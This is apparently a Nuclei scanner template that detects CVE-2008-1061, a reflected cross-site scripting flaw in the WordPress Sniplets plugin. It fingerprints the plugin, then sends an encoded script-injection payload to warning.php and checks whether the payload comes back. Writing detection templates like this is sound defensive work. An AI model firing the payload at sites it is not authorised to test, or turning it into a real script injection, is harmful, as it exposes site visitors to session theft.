flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - Code Snippets
  raw:
  - 'GET /wp-content/plugins/sniplets/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: CVE-2008-1061
info:
  author: dhiyaneshDK
  classification:
    cpe: cpe:2.3:a:wordpress:sniplets_plugin:1.1.2:*:*:*:*:*:*:*
    cve-id: CVE-2008-1061
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cwe-id: CWE-79
    epss-percentile: 0.37243
    epss-score: 0.00158
  description: 'WordPress Sniplets 1.1.2 and 1.2.2 plugin contains a cross-site scripting
    vulnerability which allows remote attackers to inject arbitrary web script or
    HTML via the text parameter to warning.php, notice.php, and inset.php in view/sniplets/,
    and possibly modules/execute.php; via the url parameter to view/admin/submenu.php;
    and via the page parameter to view/admin/pager.php.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 2
    product: sniplets_plugin
    vendor: wordpress
  name: WordPress Sniplets <=1.2.2 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/5194
  - https://wpscan.com/vulnerability/d0278ebe-e6ae-4f7c-bcad-ba318573f881
  - https://nvd.nist.gov/vuln/detail/CVE-2008-1061
  - http://securityreason.com/securityalert/3706
  - https://exchange.xforce.ibmcloud.com/vulnerabilities/40830
  remediation: 'Update WordPress Sniplets plugin to the latest version available,
    which addresses the XSS vulnerability.

    '
  severity: medium
  tags: cve2008,cve,xss,wp-plugin,wp,edb,wpscan,wordpress,sniplets,vuln
